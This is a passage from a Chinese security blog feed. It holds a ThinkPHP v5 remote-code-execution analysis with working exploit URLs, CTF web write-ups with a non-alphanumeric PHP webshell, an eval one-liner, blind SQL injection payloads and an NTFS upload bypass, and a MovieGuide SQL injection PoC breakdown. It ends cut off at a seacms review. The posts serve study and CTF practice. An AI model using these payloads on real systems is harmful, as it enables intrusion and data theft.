调用函数或者方法过滤</span></span><br><span class="line">            $value = call_user_func($filter, $value);<span class="comment">//调用函数</span></span><br><span class="line">        &#125; <span class="keyword">elseif</span> (is_scalar($value)) &#123;</span><br><span class="line">            <span class="keyword">if</span> (<span class="keyword">false</span> !== strpos($filter, <span class="string">'/'</span>)) &#123;</span><br><span class="line">                <span class="comment">// 正则过滤</span></span><br><span class="line">                <span class="keyword">if</span> (!preg_match($filter, $value)) &#123;</span><br><span class="line">                    <span class="comment">// 匹配不成功返回默认值</span></span><br><span class="line">                    $value = $default;</span><br><span class="line">                    <span class="keyword">break</span>;</span><br><span class="line">                &#125;</span><br><span class="line">            &#125; <span class="keyword">elseif</span> (!<span class="keyword">empty</span>($filter)) &#123;</span><br><span class="line">                <span class="comment">// filter函数不存在时, 则使用filter_var进行过滤</span></span><br><span class="line">                <span class="comment">// filter为非整形值时, 调用filter_id取得过滤id</span></span><br><span class="line">                $value = filter_var($value, is_int($filter) ? $filter : filter_id($filter));</span><br><span class="line">                <span class="keyword">if</span> (<span class="keyword">false</span> === $value) &#123;</span><br><span class="line">                    $value = $default;</span><br><span class="line">                    <span class="keyword">break</span>;</span><br><span class="line">                &#125;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> $value;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></p><p>到这里其实思路很明显，利用/分割出能利用的controller，并输入相应的参数值，接下来就是找可利用的函数。<br>v5.0版本中poc都能用</p><p>如任意命令执行<br><code>?s=/index/think\view\driver\php/display&amp;content=&lt;?php%20phpinfo();</code><br>任意文件写入，生成在index.php同一级目录<br><code>?s=index/\think\template\driver\file/write&amp;cacheFile=test.php&amp;content=&lt;?php%20phpinfo();</code><br>获取配置信息<br><code>?s=index/\think\config/get&amp;name=database.username</code><br>除此之外，还可以使用\think\request/input（v5.0版本不能用是因为think\request的构造函数为protected，不允许动态调用）<br>如任意代码执行<br><code>?s=index/\think\request/input&amp;data[]=123&amp;filter=phpinfo</code><br>invokeFunction核心ReflectionFunction<br><code>?s=index/\think\container/invokeFunction&amp;function=call_user_func&amp;vars[0]=phpinfo&amp;vars[1]=1</code><br><code>?s=index/\think\container/invokeFunction&amp;function=call_user_func_array&amp;vars[0]=phpinfo&amp;vars[1][]=1</code><br>因为think\app继承自think\container，所以改成think\app也行<br>其中call_user_func填充参数时，以数组形式，第一个为函数名，第二个为函数参数<br>call_user_func_array填充参数时，以数组形式，第一个为函数名，第二个为函数参数（也为数组形式）<br>这里v5.1只能用php7，如v5.0还可以使用assert来执行函数</p><h2 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h2><p>这次出的这个漏洞危害很大，整个调用过程也非常漂亮，值得一步一步调试。<br>其中收获大致就是了解了thinkphp v5版本路由调用的流程，v5.1版本的闭包函数构造的方式给框架带来了不一样的感受，不得不给thinkphp一个赞</p>]]></content>
      
      
      <categories>
          
          <category> codereview </category>
          
      </categories>
      
      
        <tags>
            
            <tag> cms </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>【CTF】SUCTF 2018 部分web writeup</title>
      <link href="/2018/05/28/suctf-part-web-writeup/"/>
      <url>/2018/05/28/suctf-part-web-writeup/</url>
      
        <content type="html"><![CDATA[<h1 id="SUCTF"><a href="#SUCTF" class="headerlink" title="SUCTF"></a>SUCTF</h1><p>抽了点时间做了2道SUCTF的web题，记录一下writeup。</p><a id="more"></a><h1 id="Anonymous"><a href="#Anonymous" class="headerlink" title="Anonymous"></a>Anonymous</h1><h2 id="考点"><a href="#考点" class="headerlink" title="考点"></a>考点</h2><p>php的动态函数执行，以及create_function所返回的匿名函数</p><h2 id="wp"><a href="#wp" class="headerlink" title="wp"></a>wp</h2><p>访问题目，直接给了源码<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">$MY = create_function(&quot;&quot;,&quot;some code&quot;); // 执行了cat命令，读取flag内容</span><br><span class="line">$hash = bin2hex(openssl_random_pseudo_bytes(32));</span><br><span class="line">eval(&quot;function &apos;SUCTF_&apos;.$hash()&#123;&quot;</span><br><span class="line">    .&quot;global \$MY;&quot;</span><br><span class="line">    .&quot;\$MY();&quot;</span><br><span class="line">    .&quot;&#125;&quot;);</span><br><span class="line">if(isset($_GET[&apos;func_name&apos;]))&#123;</span><br><span class="line">    $_GET[&quot;func_name&quot;]();</span><br><span class="line">    die();</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></p><p>思路比较明确，就是想办法执行create_function所产生的匿名函数。<br>而其中SUCTF_32，这个函数明确是没办法爆破出来的。那么就只能在 <code>$MY</code> 上下功夫。<br>打印一下<code>$MY</code>的值，发现create_function返回了<code>\0lambda_{number}</code>,那么就很明确了，只要暴力一下这个number就有一定几率执行该函数，这里我暴力了大概1000多就有2条执行了</p><h1 id="Getshell"><a href="#Getshell" class="headerlink" title="Getshell"></a>Getshell</h1><h2 id="考点-1"><a href="#考点-1" class="headerlink" title="考点"></a>考点</h2><p><a href="https://www.leavesongs.com/PENETRATION/webshell-without-alphanum.html" target="_blank" rel="noopener">https://www.leavesongs.com/PENETRATION/webshell-without-alphanum.html</a></p><h2 id="wp-1"><a href="#wp-1" class="headerlink" title="wp"></a>wp</h2><ol><li>首先确定可用字符，使用bp将所有可见字符暴力一遍后发现可打印字符为<code>$ () [] _ ~ . ; =</code>，以及其他不可打印字符。</li><li>根据p牛的博客，发现取反中文可以起到作用，测试<code>~({中文})</code>发现可根据中文的utf-8编码的中间2个hex码进行对字母的遍历<br><a href="http://www.herongyang.com/gb2312_gb/pinyin_32.html" target="_blank" rel="noopener">http://www.herongyang.com/gb2312_gb/pinyin_32.html</a></li><li><p>凑出字符<code>assert</code>，<code>_GET</code>，并动态执行。<br>为了凑出上面的字符，我采用逐个反取反<code>bin2hex(~(&#39;a&#39;))</code>获得中文utf-8编码的中间2个，搜表即可找到对应的中文，写一下我的getshell代码</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">$_=~(瞎);</span><br><span class="line">$__.=$_[[]==[]];</span><br><span class="line">$_=~(挟);</span><br><span class="line">$__.=$_[[]==[]];</span><br><span class="line">$_=~(挟);</span><br><span class="line">$__.=$_[[]==[]];</span><br><span class="line">$_=~(隙);</span><br><span class="line">$__.=$_[[]==[]];</span><br><span class="line">$_=~(卸);</span><br><span class="line">$__.=$_[[]==[]];</span><br><span class="line">$_=~(勋);</span><br><span class="line">$__.=$_[[]==[]];</span><br><span class="line"></span><br><span class="line">$_=~(校);</span><br><span class="line">$___.=$_[[]==[]];</span><br><span class="line">$_=~(下);</span><br><span class="line">$___.=$_[[]==[]];</span><br><span class="line">$_=~(纤);</span><br><span class="line">$___.=$_[[]==[]];</span><br><span class="line">$_=~(嫌);</span><br><span class="line">$___.=$_[[]==[]];</span><br><span class="line">$___=$$___;</span><br><span class="line">$__($___[_]);</span><br></pre></td></tr></table></figure></li><li><p>上传了shell之后就比较容易了，翻目录即可</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">system(&apos;ls /&apos;)</span><br><span class="line">system(&apos;cat /Th1s_14_f14g&apos;)</span><br></pre></td></tr></table></figure></li></ol><h1 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h1><p>记录一下getshell的坑点</p><ol><li>eval不是函数，是语句</li><li>不用引号，用中文也被php当作是字符串</li><li>UTF-8编码 <a href="http://www.herongyang.com/gb2312_gb/pinyin_32.html" target="_blank" rel="noopener">http://www.herongyang.com/gb2312_gb/pinyin_32.html</a></li></ol>]]></content>
      
      
      <categories>
          
          <category> ctf </category>
          
      </categories>
      
      
        <tags>
            
            <tag> suctf </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>【CTF】DDCTF 2018 web writeup</title>
      <link href="/2018/04/21/ddctf-2018-web-writeup/"/>
      <url>/2018/04/21/ddctf-2018-web-writeup/</url>
      
        <content type="html"><![CDATA[<h1 id="DDCTF-2018-2道WEB-Writeup"><a href="#DDCTF-2018-2道WEB-Writeup" class="headerlink" title="DDCTF 2018 2道WEB Writeup"></a>DDCTF 2018 2道WEB Writeup</h1><a id="more"></a><h2 id="WEB00-数据库的秘密"><a href="#WEB00-数据库的秘密" class="headerlink" title="WEB00 数据库的秘密"></a>WEB00 数据库的秘密</h2><h4 id="step-1"><a href="#step-1" class="headerlink" title="step 1:"></a>step 1:</h4><p>index.php 需要以IP:116.85.43.88访问，http头加入 X-Forwarded-For: 116.85.43.88 绕过</p><h4 id="step-2"><a href="#step-2" class="headerlink" title="step 2:"></a>step 2:</h4><p>绕过后是一个简单的查询功能，简单测试后发现id,title,date有安全处理，但是表单中还隐藏着author，并且没有做任何处理。以payload<code>a%&#39; &amp;&amp; &#39;%&#39;=&#39;%</code>、<code>a%&#39; &amp;&amp; &#39;%&#39;!=&#39;%</code>确定注入存在,想着用union直接提取出来，发现后台还有WAF，没绕过去，但是对于盲注，成功构造出了payload<code>a%&#39;&amp;&amp;if(1, sleep (5),1)=&#39;%</code>,发生5秒延迟。（后来想想其实可以用bool型盲注提取数据）</p><h4 id="step-3"><a href="#step-3" class="headerlink" title="step 3:"></a>step 3:</h4><p>确认了author字段可以注入，但是这道题还有一个问题就是sha1校验，要想写脚本，必须先解决这个问题。研究了一下main.js，发现以类似<code>id=title=date=author=time=</code>的字符串sha1处理后后台校验</p><h4 id="step-4"><a href="#step-4" class="headerlink" title="step 4:"></a>step 4:</h4><p>写脚本，主要包括sha1校验和时间盲注，贴一下payload</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">payload_1 = &quot;a%&apos; &amp;&amp; if((selEct LENGTH(schema_name) from information_schema.schemata limit &#123;0&#125;,1)=&#123;1&#125;,sleep (5),1)=&apos;%&quot;</span><br><span class="line">payload_2 = &quot;a%&apos; &amp;&amp; if((selEct substr(schema_name,&#123;0&#125;,1) from information_schema.schemata limit &#123;1&#125;,1)=&apos;&#123;2&#125;&apos;,sleep (5),1)=&apos;%&quot;</span><br><span class="line"># 获取到库名 ddctf</span><br><span class="line">payload_3 = &quot;a%&apos; &amp;&amp; if((selEct LENGTH(table_name) from information_schema.tables where table_schema=&apos;ddctf&apos; limit &#123;0&#125;,1)=&apos;&#123;1&#125;&apos;,sleep (5),1)=&apos;%&quot;</span><br><span class="line">payload_4 = &quot;a%&apos; &amp;&amp; if((selEct substr(table_name,&#123;0&#125;,1) from information_schema.tables where table_schema=&apos;ddctf&apos; limit &#123;1&#125;,1)=&apos;&#123;2&#125;&apos;,sleep (5),1)=&apos;%&quot;</span><br><span class="line"># 获取到表名 message, ctf_key4</span><br><span class="line">payload_5 = &quot;a%&apos; &amp;&amp; if((selEct LENGTH(column_name) from information_schema.columns where table_schema=&apos;ddctf&apos;&amp;&amp;table_name=&apos;ctf_key4&apos; limit &#123;0&#125;,1)=&apos;&#123;1&#125;&apos;,sleep (10),1)=&apos;%&quot;</span><br><span class="line">payload_6 = &quot;a%&apos; &amp;&amp; if((selEct substr(column_name,&#123;0&#125;,1) from information_schema.columns where table_schema=&apos;ddctf&apos;&amp;&amp;table_name=&apos;ctf_key4&apos; limit &#123;1&#125;,1)=&apos;&#123;2&#125;&apos;,sleep (10),1)=&apos;%&quot;</span><br><span class="line"># 获取到列名 ctf_key4:secvalue; message: id,title,author,time,status</span><br><span class="line">payload_5 = &quot;a%&apos; &amp;&amp; if((selEct LENGTH(secvalue) from ctf_key4 limit &#123;0&#125;,1)=&apos;&#123;1&#125;&apos;,sleep (10),1)=&apos;%&quot;</span><br><span class="line">payload_6 = &quot;a%&apos; &amp;&amp; if((selEct substr(secvalue,&#123;0&#125;,1) from ctf_key4 limit &#123;1&#125;,1)=&apos;&#123;2&#125;&apos;,sleep (10),1)=&apos;%&quot;</span><br><span class="line"># 获取到flag DDCTF&#123;MSBMCTFMXOCBYFYI&#125;</span><br></pre></td></tr></table></figure><h2 id="WEB01-专属链接"><a href="#WEB01-专属链接" class="headerlink" title="WEB01 专属链接"></a>WEB01 专属链接</h2><h4 id="step-1-1"><a href="#step-1-1" class="headerlink" title="step 1:"></a>step 1:</h4><p>根据题目提示，题目只跟链接IP有关，所以主要有<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">http://116.85.48.102:5050/welcom/uuid #主页 注意到上面有email:3814166715717836733@didichuxing.com</span><br><span class="line">http://116.85.48.102:5050/image/banner/ZmF2aWNvbi5pY28= # 给了提示，只能下载.class,.ks,.ico,.xml文件</span><br><span class="line">http://116.85.48.102:5050/news/topFiveNews # 没用</span><br><span class="line">http://116.85.48.102:5050//flag/testflag/yourflag #访问报错，但是暴露了控制器路径com.didichuxing.ctf.controller.user.FlagController.java</span><br></pre></td></tr></table></figure></p><h4 id="step-2-1"><a href="#step-2-1" class="headerlink" title="step 2:"></a>step 2:</h4><p>那么接下来就是猜路径了，在github上找了个springmvc+mybatis的<a href="https://github.com/liyifeng1994/ssm" target="_blank" rel="noopener">项目</a>,经过测试，发现一下几个文件</p><ul><li>../../WEB-INF/web.xml # 得到WEB-INF/applicationContext.xml，com.didichuxing.ctf.listener.InitListener</li><li>../../WEB-INF/applicationContext.xml # 得到classpath:mybatis/config.xml</li><li>../../WEB-INF/classes/mybatis/config.xml # 得到mapper/FlagMapper.xml</li><li>../../WEB-INF/classes/mapper/FlagMapper.xml # sql语句</li><li>../../WEB-INF/classes/com/didichuxing/ctf/model/Flag.class</li><li>../../WEB-INF/classes/com/didichuxing/ctf/listener/InitListener.class</li><li>../../WEB-INF/classes/com/didichuxing/ctf/controller/user/FlagController.class</li><li>../../WEB-INF/classes/sdl.ks # 密钥文件</li><li>../../WEB-INF/classes/com/didichuxing/ctf/service/impl/FlagServiceImpl.class</li><li>../../WEB-INF/classes/com/didichuxing/ctf/dao/FlagDao.class</li></ul><h4 id="step-3-1"><a href="#step-3-1" class="headerlink" title="step 3:"></a>step 3:</h4><p>把上述的class文件<a href="http://www.javadecompilers.com/" target="_blank" rel="noopener">在线反编译</a>到java，阅读后发现flagController.java</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">@RequestMapping(value=&#123;&quot;/getflag/&#123;email:[0-9a-zA-Z&apos;]+&#125;&quot;&#125;, method=&#123;org.springframework.web.bind.annotation.RequestMethod.POST&#125;)</span><br><span class="line">  public String getFlag(@PathVariable(&quot;email&quot;) String email, ModelMap model)</span><br><span class="line">  &#123;</span><br><span class="line">    Flag flag = flagService.getFlagByEmail(email);</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    return &quot;Encrypted flag : &quot; + flag.getFlag();</span><br><span class="line">  &#125;</span><br></pre></td></tr></table></figure><p>以用户的邮箱来获取加密的flag，邮箱就是首页上的邮箱，然后通过listener.java得到具体的加密过程</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">String flag = &quot;DDCTF&#123;&quot; + Math.abs(sr.nextLong()) + &quot;&#125;&quot;;</span><br><span class="line">String uuid = UUID.randomUUID().toString().replace(&quot;-&quot;, &quot;s&quot;);</span><br><span class="line"></span><br><span class="line">byte[] data = cipher.doFinal(flag.getBytes());</span><br><span class="line">byte[] e = mac.doFinal(String.valueOf(email.trim()).getBytes());</span><br><span class="line"></span><br><span class="line">Flag flago = new Flag();</span><br><span class="line">flago.setId(Integer.valueOf(id));</span><br><span class="line">flago.setFlag(byte2hex(data));</span><br><span class="line">flago.setEmail(byte2hex(e));</span><br><span class="line">flago.setOriginFlag(flag);</span><br><span class="line">flago.setUuid(uuid);</span><br><span class="line">flago.setOriginEmail(email);</span><br></pre></td></tr></table></figure><p>可以看到Email被转化为16进制的形式，所以需要先对邮箱做处理，简单编写代码（后面放上来），得到8EF662D0406A099B394DC817AB391718DD7BF29CCC1AAF32A7D7AB23C845CA27，以<code>http://116.85.48.102:5050/flag/getflag/8EF662D0406A099B394DC817AB391718DD7BF29CCC1AAF32A7D7AB23C845CA27</code>请求后得到加密的flag。</p><h4 id="step-4-1"><a href="#step-4-1" class="headerlink" title="step 4:"></a>step 4:</h4><p>接下来就是写代码解密flag了，因为密钥文件在手，只需编写程序即可，参考<a href="https://stackoverflow.com/questions/39518979/basic-program-for-encrypt-decrypt-javax-crypto-badpaddingexception-decryption?utm_medium=organic&amp;utm_source=google_rich_qa&amp;utm_campaign=google_rich_qa" target="_blank" rel="noopener">https://stackoverflow.com/questions/39518979/basic-program-for-encrypt-decrypt-javax-crypto-badpaddingexception-decryption?utm_medium=organic&amp;utm_source=google_rich_qa&amp;utm_campaign=google_rich_qa</a><br>需要注意的是这里用了私钥加密公钥解密。<br>解密后得到flag</p>]]></content>
      
      
      <categories>
          
          <category> ctf </category>
          
      </categories>
      
      
        <tags>
            
            <tag> ddctf </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>【CTF】HITB-XCTF 2018 web writeup</title>
      <link href="/2018/04/15/hitb-xctf-2018-portion-web-writeup/"/>
      <url>/2018/04/15/hitb-xctf-2018-portion-web-writeup/</url>
      
        <content type="html"><![CDATA[<h1 id="upload"><a href="#upload" class="headerlink" title="upload"></a>upload</h1><a id="more"></a><h2 id="考点"><a href="#考点" class="headerlink" title="考点"></a>考点</h2><p>windows平台的一些特性</p><ul><li><p>windows平台特性<br>windows下搜索文件用到的是FindFirstFile，该函数执行时，会将<code>&quot;&lt;&quot; =&gt; &quot;*&quot;</code>、<code>&quot;&gt;&quot; =&gt; &quot;?&quot;</code>、<code>&quot; =&gt; .</code>，所以在应用中，我们可以使用这个特性。e.g.</p><pre><code>`?filename=a&gt;  =&gt;  a?` 匹配单个字符`?filename=a&lt;  =&gt;  a*` 匹配多个字符`?filename=a&quot;  =&gt;  a.`</code></pre></li><li><p>NTFS ADS特性</p></li></ul><table><thead><tr><th style="text-align:center">上传的文件名</th><th style="text-align:center">系统结果</th></tr></thead><tbody><tr><td style="text-align:center">test.php:a.jpg</td><td style="text-align:center">生成test.php，但是无内容</td></tr><tr><td style="text-align:center">test.php::$DATA</td><td style="text-align:center">生成test.php，有内容</td></tr><tr><td style="text-align:center">test.php::$INDEX_ALLOCATION</td><td style="text-align:center">生成test.php文件夹</td></tr><tr><td style="text-align:center">test.php::$DATA.jpg</td><td style="text-align:center">生成0.jpg，有内容</td></tr><tr><td style="text-align:center">test.php::$DATA\test.jpg</td><td style="text-align:center">生成aaa.jpg，有内容</td></tr></tbody></table><h2 id="过程"><a href="#过程" class="headerlink" title="过程"></a>过程</h2><ul><li><p>step 1:<br>功能点#文件上传 #上传文件宽高 =&gt; getshell<br>环境：IIS7.0 Windows Server 2008 Standard Edition Service Pack 2</p></li><li><p>step 2:<br>文件上传功能黑名单php，文件名前缀时间戳重写，但截取上传文件名的最后一个后缀不变。简单利用ADS特性，上传test.php::$DATA</p></li><li><p>step 3:<br>上传了文件后，需要找到文件目录。pic.php返回了上传文件宽和高，猜测其使用了getimagesize，想到前段时间的一篇<a href="https://xianzhi.aliyun.com/forum/topic/2064" target="_blank" rel="noopener">帖子</a>，写个脚本跑该复杂目录</p></li></ul><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line">#!/usr/bin/env python</span><br><span class="line"># -*- coding: utf-8 -*-</span><br><span class="line"># Created by wh1t3P1g at 2018/4/11</span><br><span class="line"></span><br><span class="line">import requests</span><br><span class="line"></span><br><span class="line">str=&quot;0123456789abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ&quot;</span><br><span class="line">ret=&quot;&quot;</span><br><span class="line">for i in range(32):</span><br><span class="line">    for c in str:</span><br><span class="line">        t=ret+c</span><br><span class="line">        url=&quot;http://47.90.97.18:9999/pic.php?filename=../&quot;+t+&quot;%3C/1523456340.jpg&quot;</span><br><span class="line">        r=requests.get(url)</span><br><span class="line">        if &quot;width&quot; in r.content:</span><br><span class="line">            ret+=c</span><br><span class="line">            print ret</span><br><span class="line">            break</span><br></pre></td></tr></table></figure><p>得到目录87194f13726af7cee27ba2cfe97b60df</p><ul><li>step 4:<br>有了目录就能访问上传的一句话<code>&lt;?php eval($_POST[cmd]);?&gt;</code>，系统禁用了执行系统命令的一些函数，但是这里并不需要执行命令。<br>这里不截图了<br><code>cmd=var_dump(glob(&quot;../*&quot;));</code>得到flag.php，访问后发现需要读取flag.php的内容<br><code>cmd=echo readfile(&quot;../flag.php&quot;);</code>得到flag</li></ul><h2 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h2><p>这次就做了一道web，还有待提高和积累:)</p>]]></content>
      
      
      <categories>
          
          <category> ctf </category>
          
      </categories>
      
      
        <tags>
            
            <tag> hitbxctf </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>【Code Analysis】MovieGuide v2.0 SQLi</title>
      <link href="/2018/02/03/MovieGuide2SQLi/"/>
      <url>/2018/02/03/MovieGuide2SQLi/</url>
      
        <content type="html"><![CDATA[<h1 id="0x00"><a href="#0x00" class="headerlink" title="0x00"></a>0x00</h1><p>Detail: <a href="https://www.exploit-db.com/exploits/43346/" target="_blank" rel="noopener">Movie Guide v2.0 SQL Injection</a></p><a id="more"></a><h1 id="0x01"><a href="#0x01" class="headerlink" title="0x01"></a>0x01</h1><p>这是一个比较粗糙的开源cms，总体来说并没有对输入输出做安全处理，从PoC入手，选一个还原一下漏洞形成过程。</p><h3 id="PoC：index-php-md-SQL"><a href="#PoC：index-php-md-SQL" class="headerlink" title="PoC：index.php?md=[SQL]"></a>PoC：index.php?md=[SQL]</h3><p>定位一下md参数<br>layout.php为该cms的主要入口处理,下述的变量均没有通过安全处理，直接SQL语句，从而都可以用于数据库注入。<br><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//Get the passed variables.</span></span><br><span class="line">$mterm = filter_input(INPUT_POST, <span class="string">'tterm'</span>);</span><br><span class="line">$cterm = filter_input(INPUT_POST, <span class="string">'gterm'</span>);</span><br><span class="line">$lterm = filter_input(INPUT_GET, <span class="string">'gterm'</span>);</span><br><span class="line">$yterm = filter_input(INPUT_GET, <span class="string">'year'</span>);</span><br><span class="line">$md = filter_input(INPUT_GET, <span class="string">'md'</span>);</span><br><span class="line">$actorname = filter_input(INPUT_GET, <span class="string">'actor'</span>);</span><br><span class="line">$directorname = filter_input(INPUT_GET, <span class="string">'director'</span>);</span><br></pre></td></tr></table></figure></p><p>直接拼接入SQL语句<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$sql = &quot;SELECT * FROM `Movie_List` WHERE `Main_Dir` LIKE &apos;&quot; . $md . &quot;&apos; ORDER BY `Movie_Title` ASC Limit $start, $perpage&quot;;</span><br></pre></td></tr></table></figure></p><p>这里比较有意思的是它的PoC，以前没有见过类似的:b，PoC中使用了export_set函数</p><h3 id="EXPORT-SET-bits-on-off-separator-number-of-bits"><a href="#EXPORT-SET-bits-on-off-separator-number-of-bits" class="headerlink" title="EXPORT_SET(bits,on,off[,separator[,number_of_bits]])"></a><code>EXPORT_SET(bits,on,off[,separator[,number_of_bits]])</code></h3><p><code>Returns a string such that for every bit set in the value bits, you get an on string and for every bit not set in the value, you get an off string. Bits in bits are examined from right to left (from low-order to high-order bits). Strings are added to the result from left to right, separated by the separator string (the default being the comma character ,). The number of bits examined is given by number_of_bits, which has a default of 64 if not specified. number_of_bits is silently clipped to 64 if larger than 64. It is treated as an unsigned integer, so a value of −1 is effectively the same as 64.</code></p><p>分解一下PoC<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line">/*!02222UNION*/</span><br><span class="line">(</span><br><span class="line">    /*!02222SELECT*/ 0x253238253331253239,0x253238253332253239,</span><br><span class="line">        (</span><br><span class="line">            /*!02222Select*/</span><br><span class="line">                export_set(5,@a:=0,</span><br><span class="line">                (/*!02222select*/ count(*)/*!02222from*/(information_schema.columns)where@a:=// data-&gt;@a</span><br><span class="line">                    export_set(5,</span><br><span class="line">                        export_set(5,@a,/*!02222table_name*/,&apos;&lt;li&gt;&apos;,2)//dump table_name [0&lt;li&gt;table_name]</span><br><span class="line">                    ,/*!02222column_name*/,&apos;\n:&apos;,2)//dump column_name [0&lt;li&gt;table_name\n:columns_name]</span><br><span class="line">                )</span><br><span class="line">            ,@a,2)//set @a split char</span><br><span class="line">        )</span><br><span class="line">    ,0x253238253334253239,0x253238253335253239,0x253238253336253239,0x253238253337253239,0x253238253338253239,0x253238253339253239,0x253238253331253330253239,0x253238253331253331253239,0x253238253331253332253239</span><br><span class="line">    )-- -</span><br></pre></td></tr></table></figure></p><p>这里主要利用的是export_set函数的no，off位置来dump数据。</p><ul><li>首先通过@a:=0，定义变量a为0（可能跟mysql版本有关系，5.7.x下的mysql无法用@:=0来定义）</li><li>最里面的export_set，将table_name dump出来（结果为<code>0&lt;li&gt;table_name</code>）</li><li>接下来的一个export_set，将columns_name dump出来(结果为<code>0&lt;li&gt;table_name\n:columns_name</code>)</li><li><code>select count(*) from (information_schema.columns)where@a:=export_set(5,export_set(5,@a,table_name,&#39;&lt;li&gt;&#39;,2),column_name,&#39;\n:&#39;,2)</code>将上述的数据赋值给变量a</li><li>最后用最后一个export_set，用@a做分隔符，将数据dump出来</li></ul><h2 id="0x02-总结"><a href="#0x02-总结" class="headerlink" title="0x02 总结"></a>0x02 总结</h2><p>该cms的注入漏洞很常规，主要是学习分析了该PoC，能在未来注入绕过的地方应用。</p><ol><li>mysql的自定义变量@的应用，可以在一定程度上消除空格，以及正则<code>\bwhere\b</code>的绕过</li><li>/!02222select*/这个方法也是经常听说，也在这里用到了，一个很好的例子。</li><li>export_set的应用，比较重要的应用，在某些情况下可用于绕过</li></ol>]]></content>
      
      
      <categories>
          
          <category> codereview </category>
          
      </categories>
      
      
        <tags>
            
            <tag> cms </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>【Code Review】seacms v6.5 前台getshell</title>
      <link href="/2017/03/16/old-seacms-v6-5-getshell/"/>
      <url>/2017/03/16/old-seacms-v6-5-getshell/</url>
      
        <content type="html"><![CDATA[<h1 id="概述"><a href="#概述" class="headerlink" title="概述"></a>概述</h1><p>前段时间放在<a href="https://forum.90sec.org/forum.php?mod=viewthread&amp;tid=10291" target="_blank" rel="noopener">90sec</a>上的一篇代码审计，收拾一下放到自己博客上<br><a id="more"></a></p><h1 id="分析"><a href="#分析" class="headerlink" title="分析"></a>分析</h1><p>cms版本：6.45<br>直接上代码<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span 